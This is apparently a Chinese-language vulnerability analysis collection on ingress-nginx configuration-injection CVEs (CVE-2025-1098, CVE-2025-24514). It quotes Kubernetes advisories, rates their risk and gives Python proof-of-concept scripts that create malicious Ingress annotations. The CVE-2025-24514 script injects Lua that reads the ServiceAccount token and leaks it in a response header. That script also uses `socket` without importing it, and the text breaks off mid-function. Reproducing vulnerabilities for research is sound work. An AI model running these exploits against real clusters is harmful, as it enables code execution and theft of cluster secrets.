    *   **创建Ingress**：脚本创建一个Ingress资源 (`poc-ingress-<uuid>`)，将`malicious_payload`赋值给`nginx.ingress.kubernetes.io/auth-tls-match-cn`注解。同时，它设置了`nginx.ingress.kubernetes.io/auth-tls-verify-client: "optional_no_ca"`来启用auth-tls相关逻辑，并指定了一个示例的TLS配置（注意：实际测试需要一个有效的TLS secret `poc-tls-secret`，脚本并未创建）。
    *   **等待与验证提示**：创建Ingress后，脚本会等待30秒，给ingress-nginx控制器时间来处理Ingress并更新其内部的Nginx配置。然后，它会打印提示信息，指导用户如何手动验证漏洞是否利用成功（通过访问注入的`/cve-2025-1097-poc`路径）。
    *   **清理**：在等待或发生错误后，脚本会执行清理操作，删除创建的Ingress、Service、Pod和Namespace。
4.  **潜在影响（脚本演示）**：如果目标ingress-nginx控制器存在漏洞，并且处理了此恶意Ingress，其生成的Nginx配置将包含被注入的`location /cve-2025-1097-poc`块。访问该路径将直接由Nginx返回特定响应，绕过了正常的后端服务代理，证明了配置注入的成功。真实的攻击者可以注入更复杂的配置，如执行Lua脚本来读取文件（如服务账户令牌、Secrets）或执行命令。
5.  **超时机制**：脚本包含一个大约2分钟（110秒）的整体超时机制，确保脚本不会无限期运行。
6.  **注意**：此POC仅用于安全研究和本地测试。在真实环境中运行此脚本需要明确授权。脚本中的TLS secret (`poc-tls-secret`) 和域名 (`poc.example.com`) 是示例性的，可能需要根据实际环境调整或预先创建相应资源。验证步骤需要手动执行。

---


## Issue #131008 CVE-2025-1098: ingress-nginx controller - configuration injection via unsanitized mirror annotations

- Issue 链接：[#131008](https://github.com/kubernetes/kubernetes/issues/131008)

### Issue 内容

CVSS Rating: [CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H) (Score: 8.8, High)

A security issue was discovered in [ingress-nginx](https://github.com/kubernetes/ingress-nginx) where the \`mirror-target\` and \`mirror-host\` Ingress annotations can be used to inject arbitrary configuration into nginx. This can lead to arbitrary code execution in the context of the ingress-nginx controller, and disclosure of Secrets accessible to the controller. (Note that in the default installation, the controller can access all Secrets cluster-wide.)

#### Am I vulnerable?

This issue affects ingress-nginx. If you do not have ingress-nginx installed on your cluster, you are not affected. You can check this by running \`kubectl get pods \--all-namespaces \--selector app.kubernetes.io/name=ingress-nginx\`.

##### Affected Versions

- < v1.11.0
- v1.11.0 \- 1.11.4  
- v1.12.0

#### How do I mitigate this vulnerability?

**ACTION REQUIRED:** The following steps must be taken to mitigate this vulnerability: Upgrade ingress-nginx to v1.11.5, v1.12.1, or any later version.

##### Fixed Versions

- ingress-nginx [main@2e9f373](https://github.com/kubernetes/ingress-nginx/pull/13068/commits/2e9f37380afb7853fa6daa1c3e6659550aadfd90)

To upgrade, refer to the documentation: [Upgrading Ingress-nginx](https://kubernetes.github.io/ingress-nginx/deploy/upgrade/)

#### Detection

Suspicious data within the \`mirror-target\` or \`mirror-host\` annotations of an Ingress resource could indicate an attempt to exploit this vulnerability.

If you find evidence that this vulnerability has been exploited, please contact security@kubernetes.io

##### Acknowledgements

This vulnerability was reported by Nir Ohfeld, Ronen Shustin, Sagi Tzadik and Hillai Ben Sasson from Wiz

The issue was fixed and coordinated by Marco Ebert, James Strong, Tabitha Sable, and the Kubernetes Security Response Committee


### 分析结果

**风险定级：**  
高风险

**判断依据：**  
1.  **Issue类型分析**: 该Issue报告了一个明确的安全漏洞 (CVE-2025-1098)，属于软件缺陷类型。
2.  **漏洞描述**: 漏洞存在于 `ingress-nginx` 组件中，具体是由于对 Ingress 资源中的 `mirror-target` 和 `mirror-host` 注解（annotations）处理不当，未能充分净化用户输入，导致攻击者可以注入任意的 Nginx 配置。
3.  **影响**:
    *   **任意配置注入**: 攻击者可以修改 Nginx 的行为。
    *   **任意代码执行**: 注入的配置可能包含允许执行代码的指令（例如，如果启用了 Lua 模块，可以注入 Lua 代码），代码将在 ingress-nginx controller 的 Pod 内执行，其权限通常较高。
    *   **敏感信息泄露**: 注入的配置可以用来读取 controller Pod 可以访问的文件，特别是 Kubernetes Secrets。报告中指出，默认安装下，controller 通常有权限访问集群范围内的所有 Secrets。
4.  **触发条件**: 攻击者需要拥有创建或修改 Ingress 资源的权限（`PR:L` - Low Privileges Required）。在多租户或允许用户管理自己应用的 Kubernetes 环境中，这通常是授予普通用户的权限。
5.  **CVSS评分**: 报告中给出的 CVSS 3.1 评分为 8.8 (High)，向量为 `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`。这表明漏洞可以远程利用（AV:N）、利用复杂度低（AC:L）、需要低权限（PR:L）、无需用户交互（UI:N）、作用域不变（S:U），但对机密性（C:H）、完整性（I:H）和可用性（A:H）有高影响。
6.  **风险判断依据**:
    *   该问题是明确的安全漏洞，不是 issue 提交者的问题。
    *   CVSS 评分 8.8，属于 High 级别。
    *   漏洞可导致任意代码执行（RCE）和敏感信息（集群范围 Secrets）泄露，符合高风险定义（Criterion 7）。
    *   漏洞发生在多用户场景下（Kubernetes集群），低权限用户（能创建Ingress）可以利用此漏洞攻击共享的 ingress-nginx controller，进而影响其他用户或获取更高权限（访问集群 Secrets），符合高风险定义（Criterion 8）。
    *   虽然利用需要低权限（`PR:L`），但由于其潜在影响（RCE、集群 Secret 泄露），根据 Criterion 7 和 8，仍应判断为高风险。

**复现过程：**

```python
import time
import sys
import os
import argparse
from kubernetes import client, config
from kubernetes.client.rest import ApiException
import threading
import logging
import signal

# 配置日志记录
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# 全局变量定义
NAMESPACE_NAME = "cve-2025-1098-poc-ns"
INGRESS_NAME = "cve-2025-1098-poc-ingress"
# 模拟的恶意Payload，尝试注入一个Lua块来记录日志（表明配置注入成功）
# 注意：实际的RCE或信息泄露payload会更复杂
# 这个payload假设目标ingress-nginx启用了Lua模块
# 如果没有Lua模块，注入可能导致Nginx配置错误，也能间接证明注入，但不会执行代码
PAYLOAD = "http://dummy.local/; rewrite_by_lua_block { ngx.log(ngx.ERR, \\\"CVE-2025-1098 POC triggered via annotation injection\\\") } -- "
# 使用 '--' 作为注释符尝试注释掉后面可能追加的字符，分号用于结束前一个指令

DEFAULT_TIMEOUT_SECONDS = 120 # 默认超时时间

# 超时处理
class TimeoutException(Exception):
    pass

def timeout_handler(signum, frame):
    raise TimeoutException("Script execution timed out.")

def create_test_resources(api_instance_core, api_instance_networking, payload):
    """创建用于测试的Namespace和Ingress资源"""
    # 1. 创建 Namespace
    namespace_manifest = {
        "apiVersion": "v1",
        "kind": "Namespace",
        "metadata": {"name": NAMESPACE_NAME},
    }
    try:
        logging.info(f"Creating namespace: {NAMESPACE_NAME}")
        api_instance_core.create_namespace(body=namespace_manifest)
        logging.info(f"Namespace '{NAMESPACE_NAME}' created successfully.")
        # 等待namespace实际可用（可选，但有助于后续资源创建）
        time.sleep(5)
    except ApiException as e:
        if e.status == 409: # Conflict, namespace already exists
            logging.warning(f"Namespace '{NAMESPACE_NAME}' already exists. Continuing.")
        else:
            logging.error(f"Error creating namespace: {e}")
            raise

    # 2. 创建 Ingress
    ingress_manifest = {
        "apiVersion": "networking.k8s.io/v1",
        "kind": "Ingress",
        "metadata": {
            "name": INGRESS_NAME,
            "namespace": NAMESPACE_NAME,
            "annotations": {
                # 关键：注入恶意payload到mirror-target注解
                "nginx.ingress.kubernetes.io/mirror-target": payload,
                # 需要一个mirror源注解来启用镜像功能
                "nginx.ingress.kubernetes.io/mirror-uri": "/mirror-trigger",
                 # 其他可能需要的注解，确保Ingress被控制器处理
                "kubernetes.io/ingress.class": "nginx" # 根据实际环境可能需要调整
            },
        },
        "spec": {
            "rules": [{
                "host": "cve-poc.example.com",
                "http": {
                    "paths": [{
                        "path": "/",
                        "pathType": "Prefix",
                        "backend": {
                            "service": {
                                "name": "dummy-service", # 可以是一个不存在的服务，因为关注点是注解处理
                                "port": {"number": 80},
                            }
                        },
                    }]
                },
            }]
        },
    }
    try:
        logging.info(f"Creating ingress: {INGRESS_NAME} in namespace {NAMESPACE_NAME} with malicious annotation.")
        api_instance_networking.create_namespaced_ingress(
            namespace=NAMESPACE_NAME, body=ingress_manifest
        )
        logging.info(f"Ingress '{INGRESS_NAME}' created successfully.")
        logging.info("Payload injected via 'nginx.ingress.kubernetes.io/mirror-target' annotation.")
        logging.info("If the ingress-nginx controller is vulnerable and processes this Ingress,")
        logging.info("the injected configuration might be active.")
        logging.info("Check the logs of the ingress-nginx controller pod for messages like:")
        logging.info("'CVE-2025-1098 POC triggered via annotation injection' (if Lua is enabled),")
        logging.info("or look for Nginx configuration reload errors related to the injected syntax.")

    except ApiException as e:
        logging.error(f"Error creating ingress: {e}")
        raise
    except Exception as e:
        logging.error(f"An unexpected error occurred during ingress creation: {e}")
        raise

def cleanup_resources(api_instance_core, api_instance_networking):
    """清理测试创建的资源"""
    logging.info("Cleaning up resources...")
    try:
        logging.info(f"Deleting ingress: {INGRESS_NAME} in namespace {NAMESPACE_NAME}")
        api_instance_networking.delete_namespaced_ingress(
            name=INGRESS_NAME, namespace=NAMESPACE_NAME, body=client.V1DeleteOptions()
        )
        # 等待Ingress删除完成
        time.sleep(5)
        logging.info(f"Ingress '{INGRESS_NAME}' deleted.")
    except ApiException as e:
        if e.status == 404:
            logging.warning(f"Ingress '{INGRESS_NAME}' not found, might have been deleted already.")
        else:
            logging.error(f"Error deleting ingress: {e}")
            # 继续尝试删除namespace

    try:
        logging.info(f"Deleting namespace: {NAMESPACE_NAME}")
        api_instance_core.delete_namespace(name=NAMESPACE_NAME, body=client.V1DeleteOptions())
        logging.info(f"Namespace '{NAMESPACE_NAME}' deletion initiated.")
        # Namespace删除是异步的，这里不等待完全删除完成
    except ApiException as e:
        if e.status == 404:
            logging.warning(f"Namespace '{NAMESPACE_NAME}' not found, might have been deleted already.")
        else:
            logging.error(f"Error deleting namespace: {e}")

def main():
    parser = argparse.ArgumentParser(description="POC for CVE-2025-1098 - ingress-nginx annotation injection.")
    parser.add_argument("--kubeconfig", help="Path to the kubeconfig file (optional, defaults to ~/.kube/config or KUBECONFIG env var)")
    parser.add_argument("--payload", default=PAYLOAD, help="Custom payload for the mirror-target annotation (use with caution)")
    parser.add_argument("--timeout", type=int, default=DEFAULT_TIMEOUT_SECONDS, help=f"Script execution timeout in seconds (default: {DEFAULT_TIMEOUT_SECONDS})")
    args = parser.parse_args()

    # 设置执行超时
    signal.signal(signal.SIGALRM, timeout_handler)
    signal.alarm(args.timeout)

    try:
        # 1. 加载 Kubernetes 配置
        try:
            logging.info("Loading Kubernetes configuration...")
            if args.kubeconfig:
                config.load_kube_config(config_file=args.kubeconfig)
            else:
                config.load_kube_config() # 从默认位置加载
            logging.info("Kubernetes configuration loaded successfully.")
        except Exception as e:
            logging.error(f"Failed to load Kubernetes configuration: {e}")
            logging.error("Ensure you have a valid kubeconfig file and permissions to create namespaces and ingresses.")
            sys.exit(1)

        # 2. 创建 Kubernetes API 客户端
        core_v1 = client.CoreV1Api()
        networking_v1 = client.NetworkingV1Api()

        # 3. 执行测试：创建资源
        try:
            create_test_resources(core_v1, networking_v1, args.payload)
            # 等待一段时间让控制器处理Ingress，或进行手动验证
            logging.info(f"Waiting for {args.timeout // 4} seconds to allow controller processing before cleanup...")
            time.sleep(args.timeout // 4)
            logging.info("POC execution finished. Please check controller logs or behavior manually.")
        except Exception as e:
            logging.error(f"An error occurred during resource creation: {e}")
            # 即使创建失败，也尝试清理
        finally:
            # 4. 清理资源
            cleanup_resources(core_v1, networking_v1)

    except TimeoutException:
        logging.error(f"Script timed out after {args.timeout} seconds.")
        # 超时后尝试强制清理，因为可能在创建或删除过程中卡住
        logging.warning("Attempting cleanup despite timeout...")
        try:
            core_v1_cleanup = client.CoreV1Api()
            networking_v1_cleanup = client.NetworkingV1Api()
            cleanup_resources(core_v1_cleanup, networking_v1_cleanup)
        except Exception as cleanup_e:
            logging.error(f"Error during forced cleanup after timeout: {cleanup_e}")
        sys.exit(1)
    except Exception as e:
        logging.error(f"An unexpected error occurred: {e}")
        sys.exit(1)
    finally:
        # 取消超时定时器
        signal.alarm(0)

# 直接调用 main 函数
main()
```


**解释说明：**

1.  **目的**: 该脚本旨在通过创建一个带有特制 `nginx.ingress.kubernetes.io/mirror-target` 注解的 Ingress 资源，来演示 CVE-2025-1098 漏洞。如果运行该脚本的 Kubernetes 集群中存在易受攻击的 `ingress-nginx` 版本，并且该控制器正在监视新创建的 Ingress，它将尝试处理这个包含恶意注解的 Ingress。
2.  **工作流程**:
    *   **加载配置**: 使用 `kubernetes` Python 库加载用户的 Kubernetes 配置（默认从 `~/.kube/config` 或 `KUBECONFIG` 环境变量指定的位置）。
    *   **创建 Namespace**: 创建一个临时的 Namespace (`cve-2025-1098-poc-ns`) 用于隔离测试资源。
    *   **构造 Ingress**: 定义一个 Ingress 对象，其关键在于 `metadata.annotations` 部分：
        *   `nginx.ingress.kubernetes.io/mirror-target`: 设置为 `PAYLOAD` 变量的值。这个 Payload (`http://dummy.local/; rewrite_by_lua_block { ngx.log(ngx.ERR, \"CVE-2025-1098 POC triggered via annotation injection\") } -- `) 尝试注入一个 Nginx 配置片段。它首先提供一个看似合法的 URL (虽然是假的)，然后用分号 `;` 结束该指令，接着尝试插入一个 `rewrite_by_lua_block` 指令（如果 ingress-nginx 编译了 Lua 支持）。这个 Lua 块被设计为在 Nginx 错误日志中打印一条特定消息。最后的 `-- ` 尝试注释掉任何由控制器自动附加的后续配置。
        *   `nginx.ingress.kubernetes.io/mirror-uri`: 需要设置一个值来实际启用镜像功能，否则 `mirror-target` 可能不会被处理。
        *   `kubernetes.io/ingress.class`: 确保 Ingress 被 `nginx` 类型的控制器处理。
    *   **创建 Ingress**: 使用 Kubernetes API 将构造好的 Ingress 对象部署到之前创建的 Namespace 中。
    *   **等待与提示**: 脚本创建资源后会打印成功信息，并提示用户检查 ingress-nginx controller 的日志来确认注入是否成功（通过查找 Lua 记录的消息或配置错误）。脚本会暂停一小段时间允许控制器反应。
    *   **清理**: 在脚本执行结束或发生错误时（通过 `finally` 块），尝试删除创建的 Ingress 和 Namespace，以保持环境整洁。
    *   **超时机制**: 使用 `signal.alarm` 设置了执行超时（默认120秒），防止脚本因网络问题或API调用卡死而无限期运行。
3.  **验证**:
    *   脚本本身不直接验证漏洞利用是否成功（例如，不尝试 `kubectl exec` 进入 Pod 检查日志或执行代码）。
    *   使用者需要手动检查 `ingress-nginx-controller` Pod 的日志。如果漏洞存在且被利用：
        *   可能会看到类似 "CVE-2025-1098 POC triggered via annotation injection" 的错误日志（如果 Lua 模块启用且注入成功）。
        *   或者，可能会看到 Nginx 配置重载失败的错误日志，指示注入的语法破坏了 Nginx 配置。
        *   更高级的 Payload 可能尝试将敏感信息（如服务账户令牌）发送到外部服务器，或执行命令，这需要更复杂的验证步骤。
4.  **假设**:
    *   脚本假设用户具有连接到 Kubernetes 集群的 `kubeconfig` 文件，并且该配置具有创建 Namespace 和 Ingress 资源的权限。
    *   脚本假设集群中运行着一个易受 CVE-2025-1098 影响的 `ingress-nginx` 控制器实例，并且该控制器配置为处理带有 `kubernetes.io/ingress.class: nginx` 注解的 Ingress。
    *   脚本使用的 Payload 依赖于 Lua 模块的存在来记录消息；如果 Lua 未启用，注入可能仍会发生但表现为配置错误。
5.  **安全性**: 此脚本仅用于教育和本地测试目的，以演示漏洞的存在。Payload 本身设计为相对无害（仅记录日志），但修改 Payload 可能导致实际危害。请勿在未经授权的系统上运行。

---


## Issue #131006 CVE-2025-24514: ingress-nginx controller - configuration injection via unsanitized auth-url annotation

- Issue 链接：[#131006](https://github.com/kubernetes/kubernetes/issues/131006)

### Issue 内容

CVSS Rating: [CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H) (Score: 8.8, High)

A security issue was discovered in [ingress-nginx](https://github.com/kubernetes/ingress-nginx) where the \`auth-url\` Ingress annotation can be used to inject configuration into nginx. This can lead to arbitrary code execution in the context of the ingress-nginx controller, and disclosure of Secrets accessible to the controller. (Note that in the default installation, the controller can access all Secrets cluster-wide.)

#### Am I vulnerable?

This issue affects ingress-nginx. If you do not have ingress-nginx installed on your cluster, you are not affected. You can check this by running \`kubectl get pods \--all-namespaces \--selector app.kubernetes.io/name=ingress-nginx\`.

This issue does not affect you if you have the \`enable-annotation-validation\` CLI argument enabled. (This option is enabled by default starting from ingress-nginx v1.12.0.)

##### Affected Versions

- < v1.11.0
- v1.11.0 \- 1.11.4  
- v1.12.0

#### How do I mitigate this vulnerability?

**ACTION REQUIRED:** The following steps must be taken to mitigate this vulnerability: Upgrade ingress-nginx to v1.11.5, v1.12.1, or any later version.

Prior to upgrading, this vulnerability can be mitigated by setting the \`enable-annotation-validation\` CLI argument to “true”.

##### Fixed Versions

- ingress-nginx [main@ab470eb](https://github.com/kubernetes/ingress-nginx/pull/13068/commits/ab470eb920924d62a197ebddd8a4cc3031a77ddf)

To upgrade, refer to the documentation: [Upgrading Ingress-nginx](https://kubernetes.github.io/ingress-nginx/deploy/upgrade/)

#### Detection

Suspicious data within the \`auth-url\` annotation of an Ingress resource could indicate an attempt to exploit this vulnerability.

If you find evidence that this vulnerability has been exploited, please contact security@kubernetes.io

##### Acknowledgements

This vulnerability was reported by Nir Ohfeld, Ronen Shustin and Sagi Tzadik from Wiz

The issue was fixed and coordinated by Marco Ebert, James Strong, Tabitha Sable, and the Kubernetes Security Response Committee


### 分析结果

**风险定级：**  
高风险

**判断依据：**  
1.  **Issue 类型**: 该 Issue 描述了一个已确认的安全漏洞 (CVE-2025-24514)，并非功能 Bug 或普通咨询。
2.  **漏洞描述**: 漏洞存在于 Kubernetes 的 ingress-nginx 控制器中。具体来说，`nginx.ingress.kubernetes.io/auth-url` 这个 Ingress Annotation 未经充分净化(unsanitized)，允许攻击者注入 Nginx 配置。
3.  **潜在影响**:
    *   **配置注入**: 攻击者可以修改 Nginx 的行为。
    *   **任意代码执行 (RCE)**: 注入的配置可能导致在 ingress-nginx controller Pod 的上下文中执行任意代码。这是最高风险的影响之一。
    *   **敏感信息泄露**: 攻击者可能利用注入的配置读取 controller Pod 可访问的敏感信息，特别是 Kubernetes Secrets。Issue 中特别提到，在默认安装下，controller 通常有权限访问集群范围内的所有 Secrets，这极大地放大了信息泄露的风险。
4.  **触发条件**: 攻击者需要拥有创建或修改 Ingress 资源的权限 (CVSS 中的 `PR:L` - Low Privilege，指需要非管理员但具有特定操作权限的用户)。
5.  **受影响版本**: 明确列出了受影响的 ingress-nginx 版本 (< v1.11.0, v1.11.0 - 1.11.4, v1.12.0)。
6.  **缓解措施**: 升级到修复版本 (v1.11.5, v1.12.1+) 或启用 `enable-annotation-validation` CLI 参数 (v1.12.0+ 默认启用)。
7.  **CVSS 评分**: 官方给出的 CVSS 3.1 评分为 8.8 (High)，向量为 `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`。这表明漏洞可以通过网络利用 (`AV:N`)，利用复杂度低 (`AC:L`)，需要较低权限 (`PR:L`)，不需要用户交互 (`UI:N`)，影响范围不变 (`S:U`)，但对机密性 (`C:H`)、完整性 (`I:H`) 和可用性 (`A:H`) 都有高影响。
8.  **规则匹配**:
    *   规则 3: CVSS 8.8 > High，判断为高风险。
    *   规则 7: 明确提到可能导致"任意代码执行"，必须判断为高风险。
    *   规则 8: 低权限用户 (能创建 Ingress) 可以影响整个 ingress controller，进而可能影响集群中的所有用户和访问所有 Secret，符合高风险场景。
    *   规则 5: 虽然需要低权限，但由于是 RCE (规则 7)，不降级。

**复现过程：**

```python
import kubernetes
import time
import threading
import http.server
import socketserver
import requests
import sys
import signal
import os

# --- 配置 ---
NAMESPACE = "default"  # 目标命名空间
INGRESS_NAME = "poc-ingress-cve-2025-24514"
SERVICE_NAME = "dummy-service" # 需要一个后端服务，可以不存在，仅用于Ingress规则
SERVICE_PORT = 80
AUTH_SERVER_PORT = 10888 # 本地监听的假认证服务器端口
TIMEOUT_SECONDS = 120 # 脚本总执行超时时间

# --- 恶意 Payload ---
# 这个 Payload 尝试注入 Lua 代码块 (需要 ingress-nginx 启用 Lua 模块)
# 它会读取 ServiceAccount Token 并将其放入响应头 X-Leaked-Token 中
# 注意：实际注入的 payload 取决于 ingress-nginx 如何处理 annotation 中的换行符和特殊字符
# 这个 payload 假设 '}' 可以闭合某个上下文，然后注入 lua_block
# 并使用 '#' 注释掉可能的后续内容。
# 使用一个本地不存在的认证 URL，注入点在于 Nginx 配置生成过程
PAYLOAD = f'http://127.0.0.1:{AUTH_SERVER_PORT}/auth"}} \n lua_block {{ local f = io.open("/var/run/secrets/kubernetes.io/serviceaccount/token", "r"); if f then local token = f:read("*a"); f:close(); ngx.header["X-Leaked-Token"] = token; else ngx.header["X-Leaked-Token"] = "Error-Reading-Token"; end }} \n # '

# --- 全局变量 ---
stop_event = threading.Event()
ingress_client = None
core_client = None
server_thread = None
httpd = None

# --- HTTP 服务器 ---
class SimpleAuthHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        print(f"[+] Dummy Auth Server received request: {self.path}")
        self.send_response(401) # 返回 401 未授权，模拟认证失败
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        self.wfile.write(b"Unauthorized by dummy server")

def run_dummy_auth_server(port):
    global httpd
    try:
        socketserver.TCPServer.allow_reuse_address = True
        httpd = socketserver.TCPServer(("", port), SimpleAuthHandler)
        print(f"[+] Starting dummy auth server on port {port}")
        httpd.serve_forever()
    except OSError as e:
        print(f"[!] Error starting dummy auth server: {e}", file=sys.stderr)
        stop_event.set() # Signal main thread to stop if server fails
    except Exception as e:
        print(f"[!] Unexpected error in dummy auth server: {e}", file=sys.stderr)
    finally:
        if httpd:
            httpd.server_close()
        print("[+] Dummy auth server stopped.")

# --- 超时处理 ---
def signal_handler(signum, frame):
    print("[!] Script timeout reached.", file=sys.stderr)
    stop_event.set()
    if httpd:
        # Need to call shutdown from another thread if serve_forever is blocking
        threading.Thread(target=httpd.shutdown).start()

# --- 主逻辑 ---
def create_malicious_ingress():
    print("[*] Creating malicious Ingress...")
    ingress_body = {
        "apiVersion": "networking.k8s.io/v1",
        "kind": "Ingress",
        "metadata": {
            "name": INGRESS_NAME,
            "namespace": NAMESPACE,
            "annotations": {
                # 指定使用 nginx ingress controller
                "kubernetes.io/ingress.class": "nginx",
                # 注入点：auth-url
                "nginx.ingress.kubernetes.io/auth-url": PAYLOAD,
                # 可能需要配合 auth-signin 以便在认证失败时观察效果，但主要依赖于配置注入本身
                # "nginx.ingress.kubernetes.io/auth-signin": "http://$host/oauth2/start?rd=$request_uri"
            }
        },
        "spec": {
            "rules": [{
                "host": f"{INGRESS_NAME}.example.com", # 使用一个虚拟域名
                "http": {
                    "paths": [{
                        "path": "/",
                        "pathType": "Prefix",
                        "backend": {
                            "service": {
                                "name": SERVICE_NAME,
                                "port": {
                                    "number": SERVICE_PORT
                                }
                            }
                        }
                    }]
                }
            }]
        }
    }
    try:
        api_response = ingress_client.create_namespaced_ingress(
            body=ingress_body, namespace=NAMESPACE
        )
        print(f"[+] Malicious Ingress '{INGRESS_NAME}' created.")
        return True
    except kubernetes.client.ApiException as e:
        print(f"[!] Failed to create Ingress: {e}", file=sys.stderr)
        # If Ingress already exists, maybe try to update it (requires patch permission)
        # For simplicity, we'll just error out here.
        return False
    except Exception as e:
        print(f"[!] An unexpected error occurred during Ingress creation: {e}", file=sys.stderr)
        return False

def get_ingress_ip(retry_count=10, delay=5):
    print("[*] Waiting for Ingress controller to assign IP/Hostname...")
    for i in range(retry_count):
        if stop_event.is_set(): return None
        try:
            ingress = ingress_client.read_namespaced_ingress_status(INGRESS_NAME, NAMESPACE)
            if ingress.status.load_balancer and ingress.status.load_balancer.ingress:
                ingress_info = ingress.status.load_balancer.ingress[0]
                if ingress_info.ip:
                    print(f"[+] Ingress IP found: {ingress_info.ip}")
                    return ingress_info.ip
                if ingress_info.hostname:
                    print(f"[+] Ingress Hostname found: {ingress_info.hostname}")
                    # Try to resolve hostname, might fail in some environments
                    try:
                        ip = socket.gethostbyname(ingress_info.hostname)
                        print(f"[+] Resolved {ingress_info.hostname} to {ip}")
                        return ip
                    except socket.gaierror:
                        print(f"[!] Could not resolve hostname {ingress_info.hostname}. Using hostname directly.", file=sys.stderr)
                        # Fallback to returning hostname, requests might handle it
                        return ingress_info.hostname
            print(f"[*] Ingress IP/Hostname not available yet. Retrying in {delay}s... ({i+1}/{retry_count})")
            time.sleep(delay)
        except kubernetes.client.ApiException as e:
            print(f"[!] Error reading Ingress status: {e}", file=sys.stderr)
            # Handle cases where Ingress might not be found immediately after creation
            if e.status == 404:
                print("[*] Ingress not found yet, retrying...")
            else:
                return None # Other API error
            time.sleep(delay)
        except Exception as e:
            print(f"[!] An unexpected error occurred while getting Ingress IP: {e}", file=sys.stderr)
            return None
    print("[!] Timed out waiting for Ingress IP/Hostname.", file=sys.stderr)
    return None

def test_exploit(target_ip_or_host):
    url = f"http://{target_ip_or_host}/"
    headers = {"Host": f"{INGRESS_NAME}.example.com"} # Match the host rule in Ingress
    print(f"[*] Sending request to {url} with Host header '{headers['Host']}'...")
    try:
        # Allow redirects and disable SSL verification for flexibility
        response = requests.get(url, headers=headers, timeout=10, allow_redirects=True, verify=False)
        print(f"[*] Received response status code: {response.status_code}")
        # Check if the injected header is present
        if "X-Leaked-Token" in response.headers:
            leaked_token = response.headers["X-Leaked-Token"]
            if "Error-Reading-Token" in leaked_token:
                 print("[!] Exploit might have worked, but failed to read token (permissions? path?). Header found: X-Leaked-Token={leaked_token}")
            else:
                print(f"[+] !!! VULNERABILITY CONFIRMED !!! Leaked Token (first 50 chars): {leaked_token[:50]}...")
                print(f"[+] Full Header: X-Leaked-Token={leaked_token}")

            # Even if the header indicates an error reading the token,
            # the presence of the header itself confirms successful configuration injection.
            print("[+] Configuration injection seems successful based on header presence.")

        else:
            print("[-] Leaked token header 'X-Leaked-Token' not found in response headers.")
            # print("[-] Response Headers:")
            # for k, v in response.headers.items():
            #     print(f"    {k}: {v}")
            # print("[-] Response Body (first 200 chars):")
            # print(response.text[:200])

    except requests.exceptions.ConnectionError as e:
        print(f"[!] Connection failed: {e}", file=sys.stderr)
        print("[!] This could be due to networking issues, the Ingress controller not being ready, or the IP/hostname being incorrect.")
    except requests.exceptions.Timeout:
        print("[!] Request timed out.", file=sys.stderr)
    except requests.exceptions.RequestException as e:
        print(f"[!] An error occurred during the request: {e}", file=sys.stderr)

def cleanup():
    print("[*] Cleaning up...")
    if ingress_client:
        try:
            print(f"[*] Deleting Ingress '{INGRESS_NAME}'...")
            ingress_client.delete_namespaced_ingress(INGRESS_NAME, NAMESPACE)
            # Wait a bit for deletion to be processed
            time.sleep(5)
            print(f"[+] Ingress '{INGRESS_NAME}' deleted.")
        except kubernetes.client.ApiException as e:
            # Ignore 404 Not Found errors during cleanup
            if e.status != 404:
                print(f"[!] Failed to delete Ingress: {e}", file=sys.stderr)
        except Exception as e:
            print(f"[!] An unexpected error occurred during Ingress deletion: {e}", file=sys.stderr)

    if server_thread and server_thread.is_alive():
        print("[*] Stopping dummy auth server...")
        if httpd:
             # Shutdown needs to be called from a separate thread if called while serve_forever is running
             threading.Thread(target=httpd.shutdown).start()
        else:
             # If httpd failed to start, ensure the thread stops
             stop_event.set() # Signal thread to potentially exit loop if waiting
        server_thread.join(timeout=5) # Wait for thread to finish
        if server_thread.is_alive():
            print("[!] Server thread did not stop gracefully.", file=sys.stderr)

def main():
    global ingress_client, core_client, server_thread

    # Set timeout alarm
    signal.signal(signal.SIGALRM, signal_handler)
    signal.alarm(TIMEOUT_SECONDS)

    # Disable insecure request warnings from requests package
    requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

    print(f"[*] Starting CVE-2025-24514 PoC against ingress-nginx.")
    print(f"[*] Target Namespace: {NAMESPACE}")
    print(f"[*] Ingress Name: {INGRESS_NAME}")
    print(f"[*] Payload Type: Lua injection attempting ServiceAccount token leak")
    print(f"[*] Timeout: {TIMEOUT_SECONDS} seconds")

    # Start dummy auth server in a background thread
    server_thread = threading.Thread(target=run_dummy_auth_server, args=(AUTH_SERVER_PORT,))
    server_thread.daemon = True # Allows main thread to exit even if this thread is running
    server_thread.start()
    time.sleep(1) # Give server a moment to start

    # Check if server thread is alive
    if not server_thread.is_alive() and stop_event.is_set():
        print("[!] Dummy auth server failed to start. Aborting.", file=sys.stderr)
        cleanup()
        return

    try:
        # Load Kubernetes configuration from default location (~/.kube/config)
        print("[*] Loading Kubernetes configuration...")
        try:
            kubernetes.config.load_kube_config()
            configuration = kubernetes.client.Configuration.get_default_copy()
            # Set a reasonable timeout for API calls
            configuration.timeout_seconds = 30
            kubernetes.client.Configuration.set_default(configuration)

        except kubernetes.config.ConfigException as e:
            print(f"[!] Could not load Kubernetes configuration: {e}", file=sys.stderr)
            print("[!] Ensure KUBECONFIG is set or config is in the default location.", file=sys.stderr)
            stop_event.set()
            return
        except Exception as e:
            print(f"[!] An unexpected error occurred during K8s config loading: {e}", file=sys.stderr)
            stop_event.set()
            return

        print("[+] Kubernetes configuration loaded.")
        api_client = kubernetes.client.ApiClient()
        ingress_client = kubernetes.client.NetworkingV1Api(api_client)
        core_client = kubernetes.client.CoreV1Api(api_client) # May need CoreV1Api for other checks if necessary

        # 1. Create the malicious Ingress
        if not stop_event.is_set() and create_malicious_ingress():
            # 2. Wait for the Ingress controller to assign an IP or Hostname
            target = get_ingress_ip()

